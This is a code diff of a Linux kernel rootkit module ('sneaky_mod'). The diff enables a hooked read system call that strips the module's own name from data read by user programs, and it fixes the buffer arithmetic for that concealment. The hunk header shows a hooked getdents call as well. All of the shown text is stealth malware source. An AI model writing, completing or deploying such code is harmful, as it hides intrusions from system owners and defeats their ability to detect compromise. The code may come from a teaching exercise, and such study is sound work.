@@ -90,7 +90,6 @@ asmlinkage int sneaky_sys_getdents(struct pt_regs *regs) {
 // ssize_t read(int fd, void *buf, size_t count);
 // DI, SI, DX
 asmlinkage ssize_t sneaky_sys_read(struct pt_regs *regs) {
-    /*
     ssize_t nread = original_read(regs);
     void * buf = (void *)regs->si;
     char * find = NULL;
@@ -104,17 +103,16 @@ asmlinkage ssize_t sneaky_sys_read(struct pt_regs *regs) {
     find = strnstr(buf, "sneaky_mod", strlen("sneaky_mod")); //10
     if (find != NULL) {
         printk(KERN_INFO"find sneaky_mod: %s \n", find);
-        end = strnstr(find, "\n", 1); //1
+        end = strnstr(find, "\n", strlen("\n")); //1
         printk(KERN_INFO"try to find 'enter' ing...\n");
         if (end != NULL) {
             printk(KERN_INFO"find end of sneaky_mod: %s \n", end);
-            memmove(find, end + strlen("\n"), nread - (end + 1 - find));
-            nread -= (end + 1 - find);
+            memmove(find, end + strlen("\n"), buf + nread - (end + strlen("\n")));
+            nread -= (end + strlen("\n") - find);
         }
     }
     return nread;
-     */
-    return (*original_read)(regs);
+    //return (*original_read)(regs);
 }
 
 // The code that gets executed when the module is loaded
